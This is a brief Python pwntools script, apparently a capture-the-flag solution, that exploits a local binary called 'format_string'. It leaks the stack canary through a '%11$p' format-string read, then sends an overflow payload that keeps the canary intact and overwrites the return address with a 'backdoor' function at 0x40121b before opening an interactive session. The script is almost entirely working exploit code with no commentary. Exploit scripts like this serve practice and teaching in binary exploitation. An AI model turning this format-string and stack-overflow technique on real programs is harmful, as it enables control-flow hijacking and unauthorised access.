from pwn import *
context.log_level = "debug"
context.arch = "amd64"
p = process("./format_string")
context.terminal = ['tmux', 'splitw', '-h'] 


backdoor = 0x40121b
payload = "%11$p"
p.sendlineafter("Tell me your secret:",str(payload))
p.recvuntil(":")
canary = p.recvline().strip() 
canary = int(canary[2:],16)

success("canary ->" + hex(canary))

att_payload = b'A' *0x18 + p64(canary) + b'b' * 8 + p64(backdoor)

p.sendlineafter("One chance to get my secret:",att_payload)


p.interactive()
